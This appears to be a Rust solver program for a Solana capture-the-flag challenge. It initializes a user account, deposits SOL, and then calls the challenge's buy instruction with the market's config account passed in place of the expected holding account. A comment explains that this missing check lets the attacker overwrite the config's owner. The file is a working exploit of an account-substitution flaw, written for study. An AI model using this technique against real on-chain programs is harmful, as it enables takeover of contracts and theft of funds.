use borsh::BorshSerialize;
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    pubkey::Pubkey,
};

#[derive(BorshSerialize)]
enum ChallengeInstruction {
    Initialize {
        config_bump: u8,
        item0_bump: u8,
        item1_bump: u8,
        treasury_bump: u8,
    },
    InitializeUser {
        user_bump: u8,
        user_id: u32,
    },
    Deposit {
        user_bump: u8,
        amount: u64,
    },
    Buy {
        user_bump: u8,
        config_bump: u8,
        item_bump: u8,
        item_id: u64,
        treasury_bump: u8,
        holding_bump: u8,
    },
    UpdateOwner {
        config_bump: u8,
        new_owner: Pubkey,
    },
}

entrypoint!(process_instruction);

fn process_instruction(
    _solver_program: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let it = &mut accounts.iter();

    // Outer accounts, in this exact order:
    // 0 challenge program (executable)
    // 1 user (signer)
    // 2 user-config PDA
    // 3 market CONFIG PDA
    // 4 market VAULT PDA
    // 5 RUBBERDUCK PDA
    // 6 system program
    let challenge_program = next_account_info(it)?;
    let user = next_account_info(it)?;
    let user_config = next_account_info(it)?;
    let config = next_account_info(it)?;
    let treasury = next_account_info(it)?;
    let item0 = next_account_info(it)?;
    let system_program = next_account_info(it)?;

    let program_id = *challenge_program.key;

    let (_, user_bump) =
        Pubkey::find_program_address(&[user.key.as_ref(), b"USER"], &program_id);
    let (_, config_bump) =
        Pubkey::find_program_address(&[b"CONFIG"], &program_id);
    let (_, item0_bump) =
        Pubkey::find_program_address(&[b"RUBBERDUCK"], &program_id);
    let (_, treasury_bump) =
        Pubkey::find_program_address(&[b"VAULT"], &program_id);

    // Create the user's PDA.
    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(*user.key, true),
            AccountMeta::new(*user_config.key, false),
            AccountMeta::new_readonly(*system_program.key, false),
        ],
        data: borsh::to_vec(&ChallengeInstruction::InitializeUser {
            user_bump,
            user_id: 0,
        }).unwrap(),
    };
    invoke(
        &ix,
        &[challenge_program.clone(), user.clone(), user_config.clone(), system_program.clone()],
    )?;

    // Put enough SOL into the user PDA to buy the Rubber Ducky.
    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(*user.key, true),
            AccountMeta::new(*user_config.key, false),
            AccountMeta::new_readonly(*system_program.key, false),
        ],
        data: borsh::to_vec(&ChallengeInstruction::Deposit {
            user_bump,
            amount: 2_000_000_000,
        }).unwrap(),
    };
    invoke(
        &ix,
        &[challenge_program.clone(), user.clone(), user_config.clone(), system_program.clone()],
    )?;

    // BUG: buy() never checks that `holding` is the expected HOLDING PDA.
    // Supplying CONFIG as `holding` makes it deserialize the Config as Holding
    // and overwrite Config.owner with our user's pubkey.
    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(*user.key, true),
            AccountMeta::new(*user_config.key, false),
            AccountMeta::new(*config.key, false),   // system_config
            AccountMeta::new(*treasury.key, false),
            AccountMeta::new(*config.key, false),   // holding == CONFIG
            AccountMeta::new(*item0.key, false),
            AccountMeta::new_readonly(*system_program.key, false),
        ],
        data: borsh::to_vec(&ChallengeInstruction::Buy {
            user_bump,
            config_bump,
            item_bump: item0_bump,
            item_id: 1337,
            treasury_bump,
            holding_bump: 0,
        }).unwrap(),
    };
    invoke(
        &ix,
        &[
            challenge_program.clone(),
            user.clone(),
            user_config.clone(),
            config.clone(),
            treasury.clone(),
            item0.clone(),
            system_program.clone(),
        ],
    )?;

    Ok(())
}
